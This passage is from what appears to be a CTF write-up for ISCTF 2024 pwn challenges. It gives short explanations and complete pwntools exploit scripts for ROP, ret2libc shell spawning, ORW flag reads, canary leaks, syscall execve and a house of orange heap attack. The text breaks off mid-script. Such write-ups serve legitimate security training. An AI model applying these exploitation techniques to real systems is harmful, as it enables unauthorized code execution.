有限制时间，但是在交互时候 alarm 在输入很快并没有什么影响。所以 exp 传 20000 次伪随机数即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./ez_game'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"27.25.151.12:25484\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pl <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1a0</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4E20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x4E20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4012FC</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'you want to guess: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span><span class=\"token number\">0x4E20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        v7 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">7</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/ISCTF-2024/7.png\" alt=\"img\"></p>\n<h2 id=\"ret2orw\"><a class=\"markdownIt-Anchor\" href=\"#ret2orw\">#</a> ret2orw</h2>\n<p>先泄露 libc，之后就是比较普通的 orw，直接放脚本了</p>\n<pre><code class=\"language-Python\">'''\nhuan_attack_pwn\n'''\n\nimport sys\nfrom pwn import *\n# from LibcSearcher import *\n# from ctypes import *\ncontext(arch='amd64', os='linux', log_level='debug')\n# context(arch='i386' , os='linux', log_level='debug')\nbinary = './ret2orw'\nlibc = './libc.so.6'\nhost, port = &quot;27.25.151.12:36337&quot;.split(&quot;:&quot;)\n\nprint(('\\033[31;40mremote\\033[0m: (y)\\n'\n    '\\033[32;40mprocess\\033[0m: (n)'))\n\nif sys.argv[1] == 'y':\n    r = remote(host, int(port))\nelse:\n    r = process(binary)\n\n# r = gdb.debug(binary)\n# libc = cdll.LoadLibrary(libc)\nlibc = ELF(libc)\nelf = ELF(binary)\n# srand = libc.srand(libc.time(0)) #设置种子\n\ndefault = 1\nse      = lambda data                     : r.send(data)\nsa      = lambda delim, data              : r.sendafter(delim, data)\nsl      = lambda data                     : r.sendline(data)\nsla     = lambda delim, data              : r.sendlineafter(delim, data)\nrc      = lambda numb=4096                : r.recv(numb)\nrl      = lambda time=default             : r.recvline(timeout=time)\nru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)\nrpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)\nuu32    = lambda data                     : u32(data.ljust(4, b'\\0'))\nuu64    = lambda data                     : u64(data.ljust(8, b'\\0'))\nlic     = lambda data                     : uu64(ru(data)[-6:])\npadding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)\nlg      = lambda var_name                 : log.success(f&quot;&#123;var_name&#125; ：0x&#123;globals()[var_name]:x&#125;&quot;)\nprl     = lambda var_name                 : print(len(var_name))\ndebug   = lambda command=''               : gdb.attach(r,command)\nit      = lambda                          : r.interactive()\n\npg = elf.got['puts']\npp = elf.plt['puts']\nrdi = 0x4012CE\nra = 0x4012F2\n\npl = padding(0x20) + p64(0) + p64(rdi) + p64(pg) + p64(pp) + p64(ra)\n\nsla(&quot;oh,what's this?\\n&quot;,pl)\nputs_addr = u64(rc(6).ljust(8,b'\\x00'))\nlg('puts_addr')\n\nlibc.address = puts_addr - libc.sym['puts']\nlibc_address = libc.address \nlg('libc_address')\n\nopen_addr = libc.sym['open']\nsendfile = libc.sym['sendfile']\nwrite_addr = libc.sym['write']\nrsi = 0x000000000016333a + libc_address\nrdx = 0x00000000000904a9 + libc_address\npl = padding(0x20) + p64(0)\npl += p64(rsi) + p64(elf.bss()+0x200) + p64(elf.plt['read'])\npl += p64(rdi) + p64(elf.bss()+0x200) + p64(rsi) + p64(0) + p64(open_addr)\npl += p64(rdi) + p64(3) + p64(rsi) + p64(elf.bss()+0x400) + p64(rdx) + p64(0x50) + p64(0) + p64(libc.sym['read'])\npl += p64(rdi) + p64(1) + p64(rsi) + p64(elf.bss()+0x400) + p64(rdx) + p64(0x50) + p64(0) +p64(write_addr)\n\n# debug()\nsa(&quot;oh,what's this?\\n&quot;,pl.ljust(0x100,b'\\0'))\n\nse('./flag\\x00\\x00')\nit()\n</code></pre>\n<p><img data-src=\"/img/ISCTF-2024/8.png\" alt=\"img\"></p>\n<h2 id=\"小蓝鲨stack\"><a class=\"markdownIt-Anchor\" href=\"#小蓝鲨stack\">#</a> 小蓝鲨 stack</h2>\n<p><img data-src=\"/img/ISCTF-2024/9.png\" alt=\"img\"></p>\n<p>程序代码比较简单</p>\n<p><img data-src=\"/img/ISCTF-2024/10.png\" alt=\"img\"></p>\n<p>先通过 1 字节溢出地址，返回到 libc_call_main 处，使用 printf 泄露 libc 以及再次返回到 main。</p>\n<p>然后打 ret2libc 即可</p>\n<pre><code class=\"language-Python\">'''\nhuan_attack_pwn\n'''\n\nimport sys\nfrom pwn import *\n# from LibcSearcher import *\n# from ctypes import *\ncontext(arch='amd64', os='linux', log_level='debug')\n# context(arch='i386' , os='linux', log_level='debug')\nbinary = './ezstack'\nlibc = './libc-2.31.so'\nhost, port = &quot;27.25.151.12:24744&quot;.split(&quot;:&quot;)\n\nprint(('\\033[31;40mremote\\033[0m: (y)\\n'\n    '\\033[32;40mprocess\\033[0m: (n)'))\n\nif sys.argv[1] == 'y':\n    r = remote(host, int(port))\nelse:\n    r = process(binary)\n\n# r = gdb.debug(binary)\n# libc = cdll.LoadLibrary(libc)\nlibc = ELF(libc)\nelf = ELF(binary)\n# srand = libc.srand(libc.time(0)) #设置种子\n\ndefault = 1\nse      = lambda data                     : r.send(data)\nsa      = lambda delim, data              : r.sendafter(delim, data)\nsl      = lambda data                     : r.sendline(data)\nsla     = lambda delim, data              : r.sendlineafter(delim, data)\nrc      = lambda numb=4096                : r.recv(numb)\nrl      = lambda time=default             : r.recvline(timeout=time)\nru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)\nrpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)\nuu32    = lambda data                     : u32(data.ljust(4, b'\\0'))\nuu64    = lambda data                     : u64(data.ljust(8, b'\\0'))\nlic     = lambda data                     : uu64(ru(data)[-6:])\npadding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)\nlg      = lambda var_name                 : log.success(f&quot;&#123;var_name&#125; ：0x&#123;globals()[var_name]:x&#125;&quot;)\nprl     = lambda var_name                 : print(len(var_name))\ndebug   = lambda command=''               : gdb.attach(r,command)\nit      = lambda                          : r.interactive()\npl = padding(0x20) + padding(8) + b'\\x10'\n# debug()\nse(pl)\n\nru('YhuanYhuanYhuanYhuanYhuanYhuanYYYhuanYYY')\nlibcbase = u64(rc(6).ljust(8,b'\\x00'))-0x024010\nlg('libcbase')\n\nsystem = libcbase + libc.sym['system']\nbinsh = libcbase + next(libc.search(b'/bin/sh'))\nrdi = 0x0000000000023b6a + libcbase\nlg('system')\n# pause()\n# sl('')\npl = padding(0x20) + padding(8) + p64(rdi+1) + p64(rdi) + p64(binsh) + p64(system)\nse(pl)\n\nit()\n</code></pre>\n<p><img data-src=\"/img/ISCTF-2024/5.png\" alt=\"img\"></p>\n<h2 id=\"0verf10w\"><a class=\"markdownIt-Anchor\" href=\"#0verf10w\">#</a> 0verf10w</h2>\n<p><img data-src=\"/img/ISCTF-2024/11.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/ISCTF-2024/12.png\" alt=\"img\"></p>\n<p>scanf 有长溢出漏洞，printf 格式字符串泄露 canary，vuln 有 off by one 漏洞，在 stack 中，有留下 libc_call_main 的片段。</p>\n<p><img data-src=\"/img/ISCTF-2024/13.png\" alt=\"img\"></p>\n<p>这个片段刚好，1/16 的 off by one 将栈迁移到即可</p>\n<pre><code class=\"language-Python\">'''\nhuan_attack_pwn\n'''\n\nimport sys\nfrom pwn import *\n# from LibcSearcher import *\n# from ctypes import *\ncontext(arch='amd64', os='linux', log_level='debug')\n# context(arch='i386' , os='linux', log_level='debug')\nbinary = './pwn'\nlibc = './libc.so.6'\nhost, port = &quot;27.25.151.12:32559&quot;.split(&quot;:&quot;)\n\nprint(('\\033[31;40mremote\\033[0m: (y)\\n'\n    '\\033[32;40mprocess\\033[0m: (n)'))\n\nif sys.argv[1] == 'y':\n    r = remote(host, int(port))\nelse:\n    r = process(binary)\n\n# r = gdb.debug(binary)\n# libc = cdll.LoadLibrary(libc)\nlibc = ELF(libc)\nelf = ELF(binary)\n# srand = libc.srand(libc.time(0)) #设置种子\n\ndefault = 1\nse      = lambda data                     : r.send(data)\nsa      = lambda delim, data              : r.sendafter(delim, data)\nsl      = lambda data                     : r.sendline(data)\nsla     = lambda delim, data              : r.sendlineafter(delim, data)\nrc      = lambda numb=4096                : r.recv(numb)\nrl      = lambda time=default             : r.recvline(timeout=time)\nru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)\nrpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)\nuu32    = lambda data                     : u32(data.ljust(4, b'\\0'))\nuu64    = lambda data                     : u64(data.ljust(8, b'\\0'))\nlic     = lambda data                     : uu64(ru(data)[-6:])\npadding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)\nlg      = lambda var_name                 : log.success(f&quot;&#123;var_name&#125; ：0x&#123;globals()[var_name]:x&#125;&quot;)\nprl     = lambda var_name                 : print(len(var_name))\ndebug   = lambda command=''               : gdb.attach(r,command)\nit      = lambda                          : r.interactive()\n\nsl(b'ab'*0x4+b&quot;%31$p&quot;+b'a'*0x4+b'%29$p'+b'\\x00'*7)\nru(&quot;Great, I've decided to give you a gift!\\n&quot;)\n# debug()\n# 0x7ffff7c29e40\nse(b'%9$p'*3)\nru(&quot;abababab0x&quot;)\nlibcbase = int(rc(len('7ffff7c29e40')),16) - 128 - libc.sym['__libc_start_main']\nru('0x')\ncanary = int(rc(16),16)\nlg('libcbase')\nlg('canary')\n# pause()\nru('again?????\\n')\npl = p64(0)*3 + p64(canary) + b'\\xf0'\n# debug()\nsl(pl)\n\nsystem = libc.sym['system'] + libcbase\nbinsh = next(libc.search(b'/bin/sh')) + libcbase\nrdi = libcbase + 0x000000000002a3e5\nlg('system')\n# pause()\npl = padding(0x14-8) + p64(canary) +  p64(0) + p64(rdi+1) +  p64(rdi) + p64(binsh) + p64(system)\nsla('name before that?\\n',pl)\n\n\nsla('gift!\\n','1234')\nsla('again?????\\n','1234')\nit()\n</code></pre>\n<p><img data-src=\"/img/ISCTF-2024/14.png\" alt=\"img\"></p>\n<h2 id=\"syscall\"><a class=\"markdownIt-Anchor\" href=\"#syscall\">#</a> syscall</h2>\n<p>程序代码很明显，自己设置寄存器。但是需要找一个位置去写入 binsh 字符串，找一个返回可写内存地址的系统调用即可  brk rax=12，在 init 里也有这个 malloc 提示，但是我构造 read 的读入的地方应该为远程的 bss 段，后来发现只加 0x200 放到 heap 也可以。</p>\n<pre><code class=\"language-Python\">'''\nhuan_attack_pwn\n'''\n\nimport sys\nfrom pwn import *\n# from LibcSearcher import *\n# from ctypes import *\ncontext(arch='amd64', os='linux', log_level='debug')\n# context(arch='i386' , os='linux', log_level='debug')\nbinary = './vuln'\nlibc = './libc.so.6'\nhost, port = &quot;27.25.151.12:37390&quot;.split(&quot;:&quot;)\n\nprint(('\\033[31;40mremote\\033[0m: (y)\\n'\n    '\\033[32;40mprocess\\033[0m: (n)'))\n\nif sys.argv[1] == 'y':\n    r = remote(host, int(port))\nelse:\n    r = process(binary)\n\n# r = gdb.debug(binary)\n# libc = cdll.LoadLibrary(libc)\n# libc = ELF(libc)\n# elf = ELF(binary)\n# srand = libc.srand(libc.time(0)) #设置种子\n\ndefault = 1\nse      = lambda data                     : r.send(data)\nsa      = lambda delim, data              : r.sendafter(delim, data)\nsl      = lambda data                     : r.sendline(data)\nsla     = lambda delim, data              : r.sendlineafter(delim, data)\nrc      = lambda numb=4096                : r.recv(numb)\nrl      = lambda time=default             : r.recvline(timeout=time)\nru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)\nrpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)\nuu32    = lambda data                     : u32(data.ljust(4, b'\\0'))\nuu64    = lambda data                     : u64(data.ljust(8, b'\\0'))\nlic     = lambda data                     : uu64(ru(data)[-6:])\npadding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)\nlg      = lambda var_name                 : log.success(f&quot;&#123;var_name&#125; ：0x&#123;globals()[var_name]:x&#125;&quot;)\nprl     = lambda var_name                 : print(len(var_name))\ndebug   = lambda command=''               : gdb.attach(r,command)\nit      = lambda                          : r.interactive()\n\n\ndef set_reg(rax,rdi,rsi,rdx):\n        sla('RAX : ',str(rax))\n        sla('RDI : ',str(rdi))\n        sla('RSI : ',str(rsi))\n        sla('RDX : ',str(rdx))\n\nset_reg(12,0,0,0)\n\nru('0x')\n# debug()\naddr = int(rc(12),16) - 0x10000  # bss\nlg('addr')\n# pause()\nset_reg(0,0,hex(addr),0x8)\n# pause()\nse('/bin/sh\\x00')\n# pause()\nset_reg(59,addr,0,0)\n\nit()\n</code></pre>\n<p><img data-src=\"/img/ISCTF-2024/15.png\" alt=\"img\"></p>\n<h2 id=\"orange\"><a class=\"markdownIt-Anchor\" href=\"#orange\">#</a> orange</h2>\n<p>先进行逆向一下</p>\n<p><img data-src=\"/img/ISCTF-2024/16.png\" alt=\"img\"></p>\n<p>add 没有限制 malloc 的大小，14 次 add 机会</p>\n<p><img data-src=\"/img/ISCTF-2024/17.png\" alt=\"img\"></p>\n<p>show printf 的 show</p>\n<p><img data-src=\"/img/ISCTF-2024/18.png\" alt=\"img\"></p>\n<p>edit size 重新设置，所以可以进行堆溢出漏洞</p>\n<p><img data-src=\"/img/ISCTF-2024/19.png\" alt=\"img\"></p>\n<p>这题通过题目描述，是 orange 打法，通过覆盖 top_chunk 的 size，放入 unsortbin 中，在申请泄露出 libc 和 heapbase，在打 apple 链即可，需要注意的是要堆风水的布置，不要有回车字符出现’\\n’ TUT</p>\n<pre><code class=\"language-Python\">'''\nhuan_attack_pwn\n'''\n\nimport sys\nfrom pwn import *\nfrom pwncli import *\n# from LibcSearcher import *\n# from ctypes import *\ncontext(arch='amd64', os='linux', log_level='debug')\n# context(arch='i386' , os='linux', log_level='debug')\nbinary = './pwn'\nlibc = './libc-2.27.so'\nld = './ld-2.27.so'\nhost, port = &quot;27.25.151.12:23160&quot;.split(&quot;:&quot;)\n\nprint(('\\033[31;40mremote\\033[0m: (y)\\n'\n    '\\033[32;40mprocess\\033[0m: (n)'))\n\nif sys.argv[1] == 'y':\n    r = remote(host, int(port))\nelse:\n    r = process(binary)\n\n# r = gdb.debug(binary)\n# libc = cdll.LoadLibrary(libc)\nlibc = ELF(libc)\nelf = ELF(binary)\nld = ELF(ld)\n# srand = libc.srand(libc.time(0)) #设置种子\n\ndefault = 1\nse      = lambda data                     : r.send(data)\nsa      = lambda delim, data              : r.sendafter(delim, data)\nsl      = lambda data                     : r.sendline(data)\nsla     = lambda delim, data              : r.sendlineafter(delim, data)\nrc      = lambda numb=4096                : r.recv(numb)\nrl      = lambda time=default             : r.recvline(timeout=time)\nru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)\nrpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)\nuu32    = lambda data                     : u32(data.ljust(4, b'\\0'))\nuu64    = lambda data                     : u64(data.ljust(8, b'\\0'))\nlic     = lambda data                     : uu64(ru(data)[-6:])\npadding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)\nlg      = lambda var_name                 : log.success(f&quot;&#123;var_name&#125; ：0x&#123;globals()[var_name]:x&#125;&quot;)\nprl     = lambda var_name                 : print(len(var_name))\ndebug   = lambda command=''               : gdb.attach(r,command)\nit      = lambda                          : r.interactive()\n\n\ndef menu(inputs):\n        sla('Enter \\n',str(inputs))\n\ndef exit_():\n        menu(0)\n\ndef add(size):\n        menu(1)\n        sla('size\\n',str(size))\n\ndef fake_free(idx):\n        menu(2)\n        sla('index\\n',str(idx))\n\ndef show(idx):\n        menu(3)\n        sla('index',str(idx))\n\ndef edit(idx,size,ct):\n        menu(4)\n        sla('index\\n',str(idx))\n        sla('input size\\n',str(size))\n        sla('input\\n',ct)\n\n\npayload=b'a'*(0x10) + p64(0) + p64(0xd91)\nadd(0x10)# 0 \n\nedit(0,len(payload),payload)\nadd(0xf00)# 1\n# debug()\nadd(0x400)# 2\nshow(2)\nru('index 2: ')\nlibcbase = u64(rc(6).ljust(8,b'\\x00')) - 0x3ec1f0 - 